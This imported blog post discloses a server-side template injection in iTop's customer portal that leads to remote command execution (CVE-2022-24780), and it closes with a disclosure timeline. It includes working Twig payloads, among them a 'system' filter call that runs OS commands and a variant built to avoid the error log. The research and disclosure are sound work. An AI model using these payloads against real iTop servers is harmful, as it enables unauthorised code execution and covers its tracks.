---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-03-21_itop-template-injection-inside-customer-portal.md
original_filename: 2022-03-21_itop-template-injection-inside-customer-portal.md
title: iTop – Template Injection inside customer Portal
category: documents
detected_topics:
- command-injection
- otp
- api-security
tags:
- imported
- documents
- command-injection
- otp
- api-security
language: en
raw_sha256: 315e4fe24087d6e6ea285c9416be7cc36db071c45a1445a883249f23afeff7d0
text_sha256: 6c677059035435abd0f458babe6453129539f7917ff7f457c2da8a76d355ee4a
ingested_at: '2026-06-28T07:32:10Z'
sensitivity: unknown
redactions_applied: false
---

# iTop – Template Injection inside customer Portal

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-03-21_itop-template-injection-inside-customer-portal.md
- Source Type: markdown
- Detected Topics: command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:10Z
- Redactions Applied: False
- Raw SHA256: `315e4fe24087d6e6ea285c9416be7cc36db071c45a1445a883249f23afeff7d0`
- Text SHA256: `6c677059035435abd0f458babe6453129539f7917ff7f457c2da8a76d355ee4a`


## Content

---
title: "iTop – Template Injection inside customer Portal"
page_title: "iTop – Template Injection inside customer Portal – Personal Page of Markus Krell"
url: "https://markus-krell.de/itop-template-injection-inside-customer-portal/"
final_url: "https://markus-krell.de/itop-template-injection-inside-customer-portal/"
authors: ["Markus Krell (@MarkusKrell)"]
programs: ["Combodo (iTop)"]
bugs: ["SSTI", "RCE"]
publication_date: "2022-03-21"
added_date: "2022-10-24"
source: "pentester.land/writeups.json"
original_index: 2795
---

#  iTop – Template Injection inside customer Portal 

[March 21, 2022](/itop-template-injection-inside-customer-portal/) /  [markus](/author/markus/ "Posts by markus")

iTop is an open-source web application and stands for “ _IT Operations Portal”_. According to the company it is an ITIL, web-based service management tool including a fully customizable CMDB, a helpdesk system and a document management tool.

For security testing purposes I used a docker instance of iTop (Source: <https://github.com/vbkunin/itop-docker>). However, I would not recommend using this docker configuration in a productive setup.  
  
Apart from some other issues I found a template injection that could be triggered from an authenticated portal user session (e.g. customer account).  
As a portal user I login and then view the customer account profile `/pages/exec.php/user?exec_module=itop-portal-base&exec_page=index.php&portal_id=itop-portal`

After a small modification on my own profile I clicked “Submit”, which initiated a HTTP-Post call to `/pages/exec.php/object/edit/Person/34?exec_module=itop-portal-base&exec_page=index.php&portal_id=itop-portal`

This request transmits the following details inside the body:
  
  
  operation=submit&stimulus_code=&transaction_id=test2-dZfNlP&formmanager_class=Combodo%5CiTop%5CPortal%5CForm%5CObjectFormManager&formmanager_data=%7B%22id%22%3A%22objectform-default-user-profile-615b2b7371c75%22%2C%22transaction_id%22%3A%22test2-dZfNlP%22%2C%22formmanager_class%22%3A%22Combodo%5C%5CiTop%5C%5CPortal%5C%5CForm%5C%5CObjectFormManager%22%2C%22formrenderer_class%22%3A%22Combodo%5C%5CiTop%5C%5CRenderer%5C%5CBootstrap%5C%5CBsFormRenderer%22%2C%22formrenderer_endpoint%22%3A[.. shortened .. ]&current_values%5Bphone%5D=&current_values%5Blocation_id%5D=1&current_values%5Bfunction%5D=a

It is much easier to read in an URL-decoded way and only with the important part (formmanager_data):
  
  
  &formmanager_data={"id":"objectform-default-user-profile-615b2b7371c75","transaction_id":"test2-dZfNlP","formmanager_class":"Combodo\\iTop\\Portal\\Form\\ObjectFormManager","formrenderer_class":"Combodo\\iTop\\Renderer\\Bootstrap\\BsFormRenderer","formrenderer_endpoint":"/pages/exec.php/object/edit/Person/34?exec_module=itop-portal-base&exec_page=index.php&portal_id=itop-portal","formobject_class":"Person","formobject_id":"34","formmode":"edit","formactionrulestoken":"","formproperties":{"id":"default-user-profile","type":"custom_list","fields":[],"layout":{"type":"xhtml","content":"  <!-- data-field-id attribute must be an attribute code of the class -->\n  <!-- data-field-flags attribute contains flags among read_only/hidden/mandatory/must_prompt/must_change -->\n  <div class=\"form_field\" data-field-id=\"first_name\" data-field-flags=\"read_only[... more details ..]

The json part in a nicely formatted view:
  
  
  {
  "id": "objectform-default-user-profile-615b2b7371c75",
  "transaction_id": "test2-dZfNlP",
  "formmanager_class": "Combodo\\iTop\\Portal\\Form\\ObjectFormManager",
  "formrenderer_class": "Combodo\\iTop\\Renderer\\Bootstrap\\BsFormRenderer",
  "formrenderer_endpoint": "/pages/exec.php/object/edit/Person/34?exec_module=itop-portal-base&exec_page=index.php&portal_id=itop-portal",
  "formobject_class": "Person",
  "formobject_id": "34",
  "formmode": "edit",
  "formactionrulestoken": "",
  "formproperties": {
  "id": "default-user-profile",
  "type": "custom_list",
  "fields": [],
  "layout": {
  "type": "xhtml",
  "content": "  <!-- data-field-id attribute must be an attribute code of the class -->\n  <!-- data-field-flags attribute contains flags among read_only/hidden/mandatory/must_prompt/must_change -->\n  <div class=\"form_field\" data-field-id=\"first_name\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"name\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"org_id\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"email\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"phone\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"location_id\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"function\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"manager_id\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>"
  }
  }
  }

There are several interesting parameters inside this payload. I took some time to tamper with “formmanager_class” and “formrenderer_class”. It allowed me to call different classes within the class tree, however I decided it is a dead end.  
  
The other parameter that caught my attention was “formproperties.layout.type”. As can be seen inside the source code the value is either xhtml or twig (<https://github.com/Combodo/iTop/blob/473a49ab6bac9275a123155c6c80c1f763ff9f9a/datamodels/2.x/itop-portal-base/portal/src/Brick/UserProfileBrick.php#L221>).

Sooo twig instructions can be sent to the server? I changed the layout type manually from xhtml to twig.
  
  
  &formmanager_data={"id":"objectform-default-user-profile-615b2b7371c75","transaction_id":"test2-dZfNlP","formmanager_class":"Combodo\\iTop\\Portal\\Form
  "transaction_id": "test2-dZfNlP",
  "formmanager_class": "Combodo\\iTop\\Portal\\Form\\ObjectFormManager",
  "formrenderer_class": "Combodo\\iTop\\Renderer\\Bootstrap\\BsFormRenderer",
  "formrenderer_endpoint": "/pages/exec.php/object/edit/Person/34?exec_module=itop-portal-base&exec_page=index.php&portal_id=itop-portal",
  "formobject_class": "Person",
  "formobject_id": "34",
  "formmode": "edit",
  "formactionrulestoken": "",
  "formproperties": {
  "id": "default-user-profile",
  "type": "custom_list",
  "fields": [],
  "layout": {
  **"type": "twig",**
  "content": "  <!-- data-field-id attribute must be an attribute code of the class -->\n  <!-- data-field-flags attribute contains flags among read_only/hidden/mandatory/must_prompt/must_change -->\n  <div class=\"form_field\" data-field-id=\"first_name\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"name\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"org_id\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"email\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"phone\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"location_id\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"function\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"manager_id\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>"
  }
  }
  }

I finally found a spot in “content” where twig expressions can be inserted. The fields “data-field-id” or “data-field-flags” were found to be vulnerable:
  
  
  "content": "  <!-- data-field-id attribute must be an attribute code of the class -->\n  <!-- data-field-flags attribute contains flags among read_only/hidden/mandatory/must_prompt/must_change -->\n  <div class=\"form_field\" **data-field-id=\"first_name{{2*3}}\"** data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"name\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"org_id\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"email\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"phone\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"location_id\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"function\">\n\t\t\t\t\t\t\t</div>\n  <div class=\"form_field\" data-field-id=\"manager_id\" data-field-flags=\"read_only\">\n\t\t\t\t\t\t\t</div>"

Which on the server side results in an error.log entry as shown below:
  
  
  2021-10-04 18:36:29 | Error  | Oops! An error has occured.: Unknown attribute **first_name6** from class Person | IssueLog

By sending the following `data-field-id=\"**first_name{{['id']|filter('system')}}** \"` the OS command gets executed and the error log shows:
  
  
  2021-10-04 18:38:39 | Error  | Oops! An error has occured.: Unknown attribute **first_nameuid=33(www-data) gid=33(www-data) groups=33(www-data)** Array from class Person | IssueLog

To avoid this kind of logging the following parameter could be used

`data-field-id%3D%5C%22first_name{{['echo+pwned+>+/tmp/pwned']|filter('system')|join(',')}}%5C%22`  
The added join instruction coverts the resulting array into a single string to avoid an entry into the error.log of iTop. 

This allows to execute OS commands via template injection. I found the issue to be present on other functions than profile submission as well. For example by updating an incident ticket from a customer perspective. I verified the issue to be present in version 3.0.0-beta-7312 and 2.7.4-7194.

My estimation from a CVSSv3 point of view is a 9.9 <https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H>  
  
Combodo quickly acknowleged the issue and began working on a patch. They have published a fixed version but did not disclose any details about fixed security issues as of today (Release Notes: <https://www.itophub.io/wiki/page?id=latest%3Arelease%3Achange_log#section276>). **Update** : Combodo released details as listed in the timeline.

**Timeline**  
04.10.2021 Reported issue to Combodo  
06.10.2021 Acknowlegement of receiption  
19.10.2021 Acknowlegement of vulnerability  
05.01.2022 Release of patched 2.7.6 version  
21.03.2022 Release of PoC  
05.04.2022 Release of details by Combodo and [CVE-2022-24780](ttps://github.com/Combodo/iTop/security/advisories/GHSA-v97m-wgxq-rh54) issued

[Uncategorized](/category/uncategorized/)

##### [Previous post Admin capabilities around your ears ](/admin-capabilities-around-your-ears/)
